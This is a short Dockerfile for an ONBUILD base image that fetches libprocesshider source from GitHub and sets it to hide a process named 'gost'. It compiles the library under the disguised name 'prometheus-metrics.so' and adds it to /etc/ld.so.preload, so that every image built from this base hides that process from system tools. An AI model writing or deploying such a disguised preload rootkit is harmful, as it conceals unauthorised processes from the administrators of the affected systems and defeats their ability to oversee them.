ARG BASE_IMAGE="debian:11"
FROM $BASE_IMAGE

ONBUILD RUN apt-get update \
    && apt-get install -y --no-install-recommends build-essential make wget ca-certificates golang \
        procps curl gcc libc6-dev gcc-multilib \
    && rm -rf /var/lib/apt/lists/*

ONBUILD WORKDIR /app

ONBUILD ADD https://raw.githubusercontent.com/rafaelcalleja/libprocesshider/master/processhider.c ./processhider.c

ONBUILD ARG METRICS_PROCCESS={"gost"}
ONBUILD RUN sed -i 's={"evil_script.py"}=$METRICS_PROCCESS=g' processhider.c

ONBUILD RUN gcc -Wall -fPIC -shared -o prometheus-metrics.so processhider.c -ldl && \
    mv prometheus-metrics.so /usr/local/lib/ && \
    echo /usr/local/lib/prometheus-metrics.so >> /etc/ld.so.preload && \
    ldconfig && rm processhider.c
